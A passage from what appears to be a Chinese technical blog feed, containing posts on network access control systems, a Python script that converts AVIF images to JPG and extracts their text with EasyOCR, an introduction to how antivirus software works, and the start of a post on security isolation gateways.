title="四、准入控制系统的特点"></a>四、准入控制系统的特点</h2><p>准入控制系统的特点主要包括以下几点：</p><ol><li>安全性：准入控制系统实现对网络边界准入的控制，对所有入网终端的统一身份认证、未经允许的设备无法进入网络，可以对网络设备和应用进行集中管理和控制，可以批量处理和更新设备或用户的安全策略，大大提高了网络管理的效率。</li><li>合规性：准入控制系统一般采用“不改变网络、不装客户端”的特性，重点解决网络的合规性要求，达到“违规不入网、入网必合规”的管理规范，支持包括身份认证、友好WEB重定向引导、基于角色的动态授权访问控制、可配置的安全检查规范库、“一键式”智能修复、实名日志审计等功能，满足等级保护对网络边界、终端防护的相应要求，同时提供更高效、更智能的网络准入防护体系。</li><li>灵活性：准入控制系统支持多样化的认证方式及多种认证协议，对所有入网设备进行身份认证，支持包括MAC地址、IP地址、基于用户名和密码的身份、接入设备端口、所在VLAN等信息，还支持U-KEY、支持智能卡、数字证书认证，LDAP、无缝结合域管理。</li><li>可靠性：准入控制系统以电信级稳定的、专业化硬件平台，提供更高的可靠性与稳定性。</li><li>高效性：准入控制系统对网络流量进行监控和管理，限制不安全协议和流量的传输，保障网络带宽和稳定性。</li></ol><p>此外，准入控制系统还具有集成性、易用性和可扩展性等特性，可以根据企业网络规模和安全需求进行灵活配置和扩展。</p><h2 id="五、准入控制系统的部署方式"><a href="#五、准入控制系统的部署方式" class="headerlink" title="五、准入控制系统的部署方式"></a>五、准入控制系统的部署方式</h2><h3 id="1-网关模式"><a href="#1-网关模式" class="headerlink" title="1. 网关模式"></a>1. 网关模式</h3><p>采用网关部署模式时，将准入控制系统上行端口（与终端相连的端口）设置为要求通过EAP认证，将其下行端口（与外网相连的端口）设置为不要求通过EAP认证。终端设备发送的数据包全部通过准入控制系统，并由系统要求终端进行EAP认证。NACC根据源IP地址对应的设备的网络准入控制状态来决定是允许、拒绝还是重定向。其部署方式如下图所示：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2024/20240204/1-%E7%BD%91%E5%85%B3%E6%A8%A1%E5%BC%8F.png" alt="网关模式"></p><h3 id="2-控制旁路模式"><a href="#2-控制旁路模式" class="headerlink" title="2. 控制旁路模式"></a>2. 控制旁路模式</h3><p>将准入控制系统部署在网络中的汇聚层或核心层，与汇聚层或核心层的交换路由设备连接。在交换路由设备上（与准入控制相连相连的设备）启用策略路由，将上行数据包（终端设备发送的数据包）路由到准入系统中，由准入控制系统要求终端设备进行EAP认证。系统根据源IP地址对应的设备的网络准入控制状态来决定是允许、拒绝还是重定向。对于经过验证之后允许接入的数据包，其下行的数据包则从正常的路由汇聚层或核心层设备走，不经过准入设备。其部署方式如下图所示：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2024/20240204/2-%E6%8E%A7%E5%88%B6%E6%97%81%E8%B7%AF%E6%A8%A1%E5%BC%8F.png" alt="控制旁路模式"></p><h2 id="六、准入控制系统的应用场景"><a href="#六、准入控制系统的应用场景" class="headerlink" title="六、准入控制系统的应用场景"></a>六、准入控制系统的应用场景</h2><p>准入控制系统可以在多种应用场景中发挥重要作用，以下是一些常见的应用场景：</p><ol><li>无线接入控制：在无线局域网（WLAN）环境中，准入控制系统可以对接入网络的用户终端进行身份认证和安全评估，确保只有符合安全要求的终端才能接入网络。这样可以防止非法终端的接入，保护无线网络的安全。</li><li>有线网络接入控制：对于企业有线网络环境，准入控制系统同样可以对接入网络的用户终端进行身份认证和安全评估。通过控制网络访问权限，限制用户终端对网络资源的访问，保护企业网络资源的安全性。</li><li>远程接入控制：在远程接入企业网络的环境中，准入控制系统可以实施安全策略，对远程用户进行身份认证和安全评估。通过控制远程用户的网络访问行为，保障企业网络的安全性和可靠性。</li><li>虚拟化环境：在云计算和虚拟化环境中，准入控制系统可以对虚拟机进行统一的管理和安全控制。通过实施安全策略和进行安全评估，保障虚拟机的安全性和合规性。</li><li>终端安全管理：准入控制系统可以对接入网络的用户终端进行全面的安全管理，包括软件安装、系统配置、防病毒软件等的安全性进行评估。通过及时发现和修复终端上的安全漏洞，减少安全事件的发生，提高终端的安全性。</li></ol><p>准入控制系统可以在无线接入、有线网络接入、远程接入、虚拟化环境和终端安全管理等多种应用场景中发挥重要作用，提高企业网络的安全性和可靠性。</p><h2 id="七、企业如何利用准入控制系统来保护信息资产的安全？"><a href="#七、企业如何利用准入控制系统来保护信息资产的安全？" class="headerlink" title="七、企业如何利用准入控制系统来保护信息资产的安全？"></a>七、企业如何利用准入控制系统来保护信息资产的安全？</h2><p>企业可以利用准入控制系统来保护信息资产的安全，具体措施如下：</p><ol><li>控制终端接入：通过身份认证、安全技术测评等手段，对接入网络的用户终端进行身份验证和安全评估，确保只有符合安全要求的终端才能接入网络。这样可以防止非法终端的接入，保护企业网络的安全。</li><li>实施终端安全策略：对用户终端实施安全策略，包括软件安装、系统配置、网络访问权限等，确保用户终端的安全性。这样可以及时发现和防止终端上的安全漏洞和隐患，减少安全事件的发生。</li><li>控制网络访问：通过控制网络访问权限，限制用户终端对网络资源的访问，防止未经授权的访问和数据泄露。这样可以保护企业网络资源不被非法获取和使用，保障企业的机密信息安全。</li><li>日志审计：对用户终端的网络访问行为进行日志记录和审计，以便及时发现和处理安全事件。通过审计功能，可以追溯和还原终端的网络访问行为，及时发现和处理安全事件，提高企业网络的安全性和可靠性。</li><li>集成其他安全产品：准入控制系统可以与其他网络安全产品进行集成，实现更全面的网络安全防护。通过与防火墙、入侵检测系统等其他安全产品的集成，可以提供更加完善的安全解决方案，提高企业网络的安全防护能力。</li><li>灵活部署和扩展性：准入控制系统支持多种部署方式，可以根据企业网络规模和安全性要求进行灵活配置。同时，该系统支持可扩展性，可以根据企业网络的发展和变化进行升级和扩展。这样可以满足企业不断发展的需求，提高企业的信息安全管理水平。</li></ol><p>综上所述，企业可以利用准入控制系统来保护信息资产的安全，通过控制终端接入、实施终端安全策略、控制网络访问、日志审计、集成其他安全产品以及灵活部署和扩展性等措施，提高企业网络的安全性和可靠性。</p><hr><p>博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python实现avif图片转jpg格式并识别图片中的文字</title>
      <link href="/posts/25495876/"/>
      <url>/posts/25495876/</url>
      
        <content type="html"><![CDATA[<p>在做数据分析的时候有些数据是从图片上去获取的，这就需要去识别图片上的文字。Python有很多库可以很方便的实现OCR识别图片中的文字。这里介绍用EasyOCR库进行图片文字识别。easyocr是一个比较流行的库，支持超过80种语言，识别率高，速度也比较快。</p><h2 id="一、图片识别文字"><a href="#一、图片识别文字" class="headerlink" title="一、图片识别文字"></a>一、图片识别文字</h2><h3 id="1、导包"><a href="#1、导包" class="headerlink" title="1、导包"></a>1、导包</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install easyocr</span><br></pre></td></tr></table></figure><h3 id="2、代码实现"><a href="#2、代码实现" class="headerlink" title="2、代码实现"></a>2、代码实现</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> easyocr</span><br><span class="line"><span class="comment"># 用easyocr识别图片并提取文字</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">easyocr_pic</span><span class="params">(pic_path)</span>:</span></span><br><span class="line">    reader = easyocr.Reader([<span class="string">'ch_sim'</span>, <span class="string">'en'</span>])</span><br><span class="line">    results = reader.readtext(pic_path)</span><br><span class="line">    ocr_result_dict = &#123;&#125;</span><br><span class="line">    result_list = []</span><br><span class="line">    <span class="keyword">for</span> result <span class="keyword">in</span> results:</span><br><span class="line">        result_list.append(result[<span class="number">1</span>])</span><br><span class="line">    ocr_result_dict[<span class="string">'orc_reslut'</span>]=result_list</span><br><span class="line">    <span class="keyword">return</span> ocr_result_dict</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    orc_result = easyocr_pic(<span class="string">r'waf.png'</span>)</span><br><span class="line">    print(orc_result)</span><br></pre></td></tr></table></figure><h3 id="3、运行效果"><a href="#3、运行效果" class="headerlink" title="3、运行效果"></a>3、运行效果</h3><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2024/20240131/1-%E9%98%B2%E7%81%AB%E5%A2%99%E8%AF%86%E5%88%AB%E5%9B%BE%E7%89%87.png" alt="图片OCR识别效果"></p><p>可以看到图片中的中文“防火墙”和”Web应用防火墙”都正确识别出来了。</p><blockquote><p>注意：文件名和文件路径都不能有中文，否则会报错。如：如果将waf.png改成web应用防火墙.png就会报如下的错误。<br> [WARN:<a href="mailto:0@11.296">0@11.296</a>] global loadsave.cpp:248 cv::findDecoder imread_(‘web应用防火墙.png’): can’t open/read file: check file path/integrity</p></blockquote><p>在进行图片识别的时候发现如果是avif格式的也会报错。如从京东商品详情页下载的图片都是avif格式的，进行识别的时候就会报错。</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2024/20240131/2-avif%E6%A0%BC%E5%BC%8Focr%E8%AF%86%E5%88%AB%E6%8A%A5%E9%94%99.png" alt="在OCR识别报错"></p><p>但是这个图片用看图软件是可以正常显示的。</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2024/20240131/3-%E7%9C%8B%E5%9B%BE%E8%BD%AF%E4%BB%B6%E6%89%93%E5%BC%80%E5%9B%BE%E7%89%87.png" alt="用看图软件打开图片"></p><p>用画图软件另存为png或jpg格式后可以用easyocr正常识别出图片中的文字。</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2024/20240131/4-%E5%8F%A6%E5%AD%98%E4%B8%BAjpg%E5%90%8E%E5%8F%AF%E4%BB%A5ocr%E8%AF%86%E5%88%AB.png" alt="在这里插入图片描述"></p><p>注意：直接将.avif的后缀名直接改成.jpg虽然可以用看图软件可以打开，但是用easyocr识别同样会报错，所以我们需要用程序来实现将avif格式的文件转成jpg或png文件格式。</p><h2 id="二、avif格式图片转jpg格式"><a href="#二、avif格式图片转jpg格式" class="headerlink" title="二、avif格式图片转jpg格式"></a>二、avif格式图片转jpg格式</h2><p>用python来实现将avif格式的文件转成jpg也很简单，但也有些注意事项。</p><h3 id="1、导包-1"><a href="#1、导包-1" class="headerlink" title="1、导包"></a>1、导包</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pillow-avif-plugin Pillow</span><br></pre></td></tr></table></figure><h3 id="2、代码实现-1"><a href="#2、代码实现-1" class="headerlink" title="2、代码实现"></a>2、代码实现</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pillow_avif  <span class="comment">#注意一定要引入pillow_avif否则会抛异常'cannot identify image file 'XXX''</span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将avif文件转成jpg文件</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert_avif_to_jpg</span><span class="params">(input_path, output_dir)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 打开AVIF图像</span></span><br><span class="line">        image = Image.open(input_path)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 获取输入路径的文件名及其所在目录</span></span><br><span class="line">        file_name = os.path.basename(input_path)</span><br><span class="line">        <span class="comment"># 构建输出路径</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(output_dir):</span><br><span class="line">            os.makedirs(output_dir)</span><br><span class="line"></span><br><span class="line">        output_path = os.path.join(output_dir, <span class="string">f"<span class="subst">&#123;os.path.splitext(file_name)[<span class="number">0</span>]&#125;</span>.jpg"</span>)</span><br><span class="line">        <span class="comment"># 保存为PNG格式</span></span><br><span class="line">        image.save(output_path, <span class="string">"JPEG"</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment"># 调用函数进行转换</span></span><br><span class="line">    convert_avif_to_jpg(<span class="string">r'5e595ea90b71f7ae.jpg.avif'</span>, <span class="string">'avif2jpg'</span>)</span><br></pre></td></tr></table></figure><h3 id="3、运行效果-1"><a href="#3、运行效果-1" class="headerlink" title="3、运行效果"></a>3、运行效果</h3><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2024/20240131/5-avif%E6%96%87%E4%BB%B6%E8%BD%ACjpg%E6%96%87%E4%BB%B6.png" alt="在这里插入图片描述"></p><p>可以看到正常将avif文件转成了jpg格式的文件。</p><h3 id="4、注意事项"><a href="#4、注意事项" class="headerlink" title="4、注意事项"></a>4、注意事项</h3><blockquote><p>import pillow_avif  #注意一定要引入pillow_avif否则会抛异常’cannot identify image file ‘XXX’’<br>虽然代码没有用到pillow_avif但是一定要显示的用import pillow_avif否则在运行的时候会抛异常’cannot identify image file ‘XXX’’</p></blockquote><h2 id="三、Python实现avif图片转jpg格式并识别文字全部代码"><a href="#三、Python实现avif图片转jpg格式并识别文字全部代码" class="headerlink" title="三、Python实现avif图片转jpg格式并识别文字全部代码"></a>三、Python实现avif图片转jpg格式并识别文字全部代码</h2><p><strong>所有代码用easyocrUtil.py实现</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> easyocr</span><br><span class="line"><span class="keyword">import</span> pillow_avif  <span class="comment">#注意一定要引入pillow_avif否则会抛异常'cannot identify image file 'XXX''</span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将avif文件转成jpg文件</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert_avif_to_jpg</span><span class="params">(input_path, output_dir)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 打开AVIF图像</span></span><br><span class="line">        image = Image.open(input_path)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 获取输入路径的文件名及其所在目录</span></span><br><span class="line">        file_name = os.path.basename(input_path)</span><br><span class="line">        <span class="comment"># 构建输出路径</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(output_dir):</span><br><span class="line">            os.makedirs(output_dir)</span><br><span class="line"></span><br><span class="line">        output_path = os.path.join(output_dir, <span class="string">f"<span class="subst">&#123;os.path.splitext(file_name)[<span class="number">0</span>]&#125;</span>.jpg"</span>)</span><br><span class="line">        <span class="comment"># 保存为PNG格式</span></span><br><span class="line">        image.save(output_path, <span class="string">"JPEG"</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 用easyocr识别图片并提取文字</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">easyocr_pic</span><span class="params">(pic_path)</span>:</span></span><br><span class="line">    reader = easyocr.Reader([<span class="string">'ch_sim'</span>, <span class="string">'en'</span>])</span><br><span class="line">    results = reader.readtext(pic_path)</span><br><span class="line">    ocr_result_dict = &#123;&#125;</span><br><span class="line">    result_list = []</span><br><span class="line">    <span class="keyword">for</span> result <span class="keyword">in</span> results:</span><br><span class="line">        result_list.append(result[<span class="number">1</span>])</span><br><span class="line">    ocr_result_dict[<span class="string">'orc_reslut'</span>]=result_list</span><br><span class="line">    <span class="keyword">return</span> ocr_result_dict</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment"># 调用函数进行转换</span></span><br><span class="line">    convert_avif_to_jpg(<span class="string">r'5e595ea90b71f7ae.jpg.avif'</span>, <span class="string">'avif2jpg'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 调用函数识别图片并提取文字</span></span><br><span class="line">    orc_result = easyocr_pic(<span class="string">r'avif2jpg\5e595ea90b71f7ae.jpg.jpg'</span>)</span><br><span class="line">    print(orc_result)</span><br></pre></td></tr></table></figure><hr><p>博客地址：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注微信公众号,一起学习、成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全产品之认识防病毒软件</title>
      <link href="/posts/4d544f9a/"/>
      <url>/posts/4d544f9a/</url>
      
        <content type="html"><![CDATA[<p>随着计算机技术的不断发展，防病毒软件已成为企业和个人计算机系统中不可或缺的一部分。防病毒软件是网络安全产品中的一种，主要用于检测、清除计算机病毒，以及预防病毒的传播。本文我们一起来认识一下防病毒软件。</p><h2 id="一、什么是计算机病毒"><a href="#一、什么是计算机病毒" class="headerlink" title="一、什么是计算机病毒"></a>一、什么是计算机病毒</h2><p>计算机病毒（Computer Virus）是一种在计算机系统内进行破坏、传播和自我复制的恶意软件。是恶意代码中的一种，详见《<a href="http://xiejava.ishareread.com/posts/72d6b06f/" target="_blank" rel="noopener">网络安全之恶意代码</a>》。它通常通过电子邮件附件、网络共享、软件下载等方式传播，能够破坏计算机的操作系统、数据文件和应用程序，导致计算机系统出现各种问题。计算机病毒是人为故意编写的，其目的是为了窃取个人信息、破坏计算机系统或者制造混乱等。<br>为了保护计算机系统的安全，用户需要采取一些措施来预防和清除计算机病毒。这些措施包括安装可靠的防病毒软件、定期更新防病毒软件和操作系统、不随意打开未知来源的邮件和链接、谨慎下载和安装软件等。</p><h2 id="二、什么是防病毒软件"><a href="#二、什么是防病毒软件" class="headerlink" title="二、什么是防病毒软件"></a>二、什么是防病毒软件</h2><p>防病毒软件也称反病毒软件，是用于消除电脑病毒、特洛伊木马和恶意软件、保护电脑安全、安全安全的一类软件的总称。杀毒软件通常集成监控识别、病毒扫描和清除和自动升级等功能，有的杀毒软件还带有数据恢复等功能。<br>防病毒软件最初是为了检测和删除计算机病毒而开发的，因此得名。但是，随着其他种类恶意软件的泛滥，防病毒软件开始提供针对其他计算机威胁的防护。特别是，现代的防病毒软件可以保护用户免受：恶意浏览器帮助对象（BHO）、浏览器劫持者、勒索软件、键盘记录程序、后门程序、rootkit、特洛伊木马、蠕虫、恶意LSP、拨号程序、欺诈工具、广告软件和间谍软件。</p><h2 id="三、防病毒软件的作用"><a href="#三、防病毒软件的作用" class="headerlink" title="三、防病毒软件的作用"></a>三、防病毒软件的作用</h2><p>一个好的防病毒软件的作用主要包括以下几点：</p><ol><li>实时监控和防护：防病毒软件可以实时监控计算机系统的运行状况，一旦发现可疑行为或病毒威胁，能够及时拦截和清除。</li><li>病毒查杀和清除：防病毒软件能够检测和清除已知的各类病毒、木马、蠕虫等恶意程序，确保计算机系统的安全。</li><li>未知病毒的检测和清除：现代的防病毒软件采用了多种技术手段，包括启发式扫描、行为监控、云安全等，能够检测和清除未知的病毒威胁，提高对未知病毒的防护能力。</li><li>系统保护和恢复：防病毒软件能够对计算机系统的关键位置进行保护，防止恶意程序的篡改和破坏。同时，提供系统恢复功能，帮助用户快速恢复受病毒影响的系统。</li><li>网络安全防护：防病毒软件通常集成了防火墙、网络监控等网络安全防护功能，能够全面保护计算机系统的网络安全。</li><li>智能升级和更新：防病毒软件能够智能检测和升级病毒库，确保用户始终拥有最新的病毒防护策略。</li><li>自定义设置：用户可以根据自己的需求对防病毒软件进行自定义设置，包括扫描范围、防护级别等，以满足不同场景下的安全需求。</li></ol><p>一个好的防病毒软件能够提供全面、高效的计算机系统保护，帮助用户避免各类病毒威胁的侵害。用户选择一款可靠、易用的防病毒软件并正确配置和使用，可以大大提高计算机系统的安全性和稳定性。</p><h2 id="四、防病毒软件的工作原理"><a href="#四、防病毒软件的工作原理" class="headerlink" title="四、防病毒软件的工作原理"></a>四、防病毒软件的工作原理</h2><p>防病毒软件检测病毒的方法有：特征码法、校验和法、行为检测法、软件模拟法。防病毒软件大致上是根据以下几个方式辨别病毒：</p><ol><li>病毒检测的方法<br>在与病毒的对抗中，及早发现病毒很重要。早发现，早处置，可以减少损失。检测病毒方法有：特征代码法、校验和法、行为监测法、软件模拟法。</li><li>特征代码法<br>特征代码法被早期应用于SCAN、CPAV等著名病毒检测工具中。国外专家认为特征代码法是检测已知病毒的最简单、开销最小的方法。</li></ol><p>具体来说，防病毒软件通过以下步骤实现对病毒的查杀：</p><ol><li>病毒库的建立：防病毒软件会建立一个包含已知病毒特征的病毒库，这些特征包括病毒的二进制代码、文件头信息、长度等信息。</li><li>文件的扫描：当防病毒软件运行时，它会扫描计算机中的文件，并将每个文件与病毒库中的特征进行比对。</li><li>特征匹配：如果某个文件的特征与病毒库中的某个病毒特征相匹配，防病毒软件就会判定该文件为病毒。</li><li>清除病毒：一旦发现病毒，防病毒软件就会采取相应的措施清除病毒，例如删除病毒文件、隔离可疑文件、清除注册表中的恶意项等。</li></ol><p>除了基于特征的扫描外，现代的防病毒软件还采用了启发式扫描、行为监控等技术来提高对未知病毒和变种病毒的检测和清除能力。</p><h2 id="五、防病毒软件的核心技术"><a href="#五、防病毒软件的核心技术" class="headerlink" title="五、防病毒软件的核心技术"></a>五、防病毒软件的核心技术</h2><p>防病毒软件主要通过两种方式来保护计算机系统：实时监控和手动扫描。实时监控是指在系统运行时，软件会持续地检查文件和内存，一旦发现病毒或可疑行为，就会立即采取措施清除病毒或阻止其传播。而手动扫描则是根据用户的需求，对指定的文件或文件夹进行全面的病毒检查。<br>防病毒软件的核心技术包括：</p><ol><li>静态扫描技术：通过对文件进行逐一的比对，检测是否存在病毒代码。</li><li>动态监控技术：实时监控系统的运行状况，对异常行为进行及时检测和拦截。</li><li>启发式扫描技术：基于行为和特征分析的扫描方式，可以检测未知病毒和变种病毒。</li><li>沙箱技术：将可能存在病毒的文件或程序在隔离的环境中运行，避免对系统造成实质性的伤害。</li><li>云安全技术：利用云端的数据和智能分析能力，提高病毒的检测率和响应速度。</li></ol><p>除了上述核心技术外，一款优秀的防病毒软件还需要具备以下特点：</p><ol><li>兼容性：能够与各种操作系统、应用程序和硬件设备兼容。</li><li>可靠性：能够准确地检测和清除病毒，避免误报和误杀。</li><li>易用性：界面友好，操作简单，易于使用和管理。</li><li>实时更新：能够及时更新病毒库和防护策略，以应对新出现的病毒威胁。</li><li>智能防护：能够根据系统的运行状况和病毒威胁的情况，自动调整防护策略，提高防护效果。</li></ol><p>防病毒软件是保护计算机系统免受病毒威胁的重要工具。选择一款优秀的防病毒软件并正确配置和使用，可以有效地提高计算机系统的安全性和稳定性。</p><h2 id="六、防病毒软件的使用方式"><a href="#六、防病毒软件的使用方式" class="headerlink" title="六、防病毒软件的使用方式"></a>六、防病毒软件的使用方式</h2><p>防病毒软件会扫描计算机文件和内存以查找表明可能存在恶意代码的模式。防病毒软件的使用方式主要包括以下几个步骤：</p><ol><li>安装防病毒软件：首先需要从正规渠道下载和安装防病毒软件，并按照提示进行操作。在安装过程中，需要注意选择需要保护的区域和功能，以及设置软件自动更新和升级等选项。</li><li>定期更新病毒库：防病毒软件的核心是其病毒库，只有不断更新病毒库才能更好地检测和清除病毒。用户需要定期更新防病毒软件，以确保拥有最新的病毒库。</li><li>定期扫描计算机：防病毒软件需要定期扫描计算机系统，以检测和清除病毒。用户可以根据自己的需求设置扫描的范围和频率，以及自定义扫描计划等。</li><li>手动扫描：如果用户怀疑某个文件或文件夹可能存在病毒，可以使用手动扫描功能对它们进行扫描和清除。在防病毒软件的界面上选择“手动扫描”功能，然后选择需要扫描的文件或文件夹即可。</li><li>实时监控：防病毒软件应该开启实时监控功能，对计算机系统的运行状况进行实时监测。一旦发现可疑行为或病毒威胁，能够及时拦截和清除。</li><li>隔离和清除：如果防病毒软件检测到恶意软件的存在，可以将其隔离或清除。根据软件的提示进行操作即可。</li><li>自定义设置：用户可以根据自己的需求对防病毒软件进行自定义设置，包括扫描范围、防护级别等，以满足不同场景下的安全需求。</li></ol><p>正确配置和使用防病毒软件是保护计算机系统免受病毒威胁的重要措施。用户需要注意软件的安装、更新、配置和使用，以最大限度地发挥其保护作用。</p><hr><p>博客地址：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全产品之认识安全隔离网闸</title>
      <link href="/posts/c420c582/"/>
      <url>/posts/c420c582/</url>
      
        <content type="html"><![CDATA[<p>随着互联网的发展，网络攻击和病毒传播的方式越来越复杂，对网络安全的要求也越来越高。传统的防火墙设备在面对一些高级的网络攻击时，往往难以做到全面的防护，因此需要一种更加有效的网络安全设备来提高网络的安全性。此外，随着信息技术的不断发展，各个行业对信息系统的依赖程度也越来越高，一旦信息系统遭受攻击或入侵，可能会导致数据泄露、系统瘫痪等严重后果。因此，对于一些高安全级别的网络环境，如政府、军队、公安、银行等，需要一种更加可靠的安全设备来保证网络的安全性。在这样的背景下，安全隔离网闸作为一种新型的网络安全设备应运而生。本文让我们一起来认识安全隔离网闸。</p><h2 id="一、什么是安全隔离网闸"><a href="#一、什么是安全隔离网闸" class="headerlink" title="一、什么是安全隔离网闸"></a>一、什么是安全隔离网闸</h2><p>安全隔离网闸，又名“网闸”、“物理隔离网闸”，是一种网络安全设备，用于实现不同安全级别网络之间的安全隔离，并提供适度可控的数据交换。安全隔离网闸是使用带有多种控制功能的固态开关读写介质连接两个独立网络系统的信息安全设备。物理隔离网闸从物理上隔离、阻断了具有潜在攻击可能的一切连接，使“黑客”无法入侵、无法攻击、无法破坏，实现了真正的安全，安全隔离闸门的功能模块有：安全隔离、内核防护、协议转换、病毒查杀、访问控制、安全审计、身份认证。</p><h2 id="二、安全隔离网闸的主要功能"><a href="#二、安全隔离网闸的主要功能" class="headerlink" 